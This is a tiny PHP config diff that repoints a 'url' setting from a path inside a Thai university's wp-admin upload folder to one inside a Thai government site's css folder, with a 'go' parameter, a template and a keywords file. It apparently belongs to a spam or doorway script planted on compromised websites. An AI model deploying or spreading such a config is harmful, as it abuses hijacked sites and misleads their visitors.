@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'https://husoc.rmu.ac.th/wp-admin/upload/',
+        'url'		=> 'https://www.lp-pao.go.th/Main60/libraries/css/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
